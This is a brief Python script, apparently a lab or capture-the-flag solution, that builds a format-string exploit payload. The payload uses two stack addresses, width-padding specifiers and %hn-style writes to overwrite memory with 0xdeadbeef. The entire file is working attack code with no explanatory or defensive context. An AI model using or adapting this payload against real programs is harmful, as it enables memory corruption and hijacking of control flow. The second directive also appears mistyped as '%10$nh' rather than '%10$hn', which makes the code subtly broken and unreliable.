PAYLOAD_HIGHER_NIBBLE = 0xdead
PAYLOAD_LOWER_NIBBLE = 0xbeef
ADDRESS_TO_OVERRIDE_LOWER = 0xbffffa98
ADDRESS_TO_OVERRIDE_HIGHER = 0xbffffa9a


def main():
    with open('input', 'wb') as dest:
        additional_length = 8
        first_chunk_length = PAYLOAD_LOWER_NIBBLE - additional_length
        second_chunk_length = PAYLOAD_HIGHER_NIBBLE - first_chunk_length - additional_length

        addr_low = int.to_bytes(ADDRESS_TO_OVERRIDE_LOWER, 4, 'little')
        addr_high = int.to_bytes(ADDRESS_TO_OVERRIDE_HIGHER, 4, 'little')

        chunk1 = f'%{first_chunk_length}x'.encode()
        chunk2 = f'%{second_chunk_length}x'.encode()
        dest.write(addr_low + addr_high + chunk1 + b'%9$hn' + chunk2 + b'%10$nh')


if __name__ == '__main__':
    main()
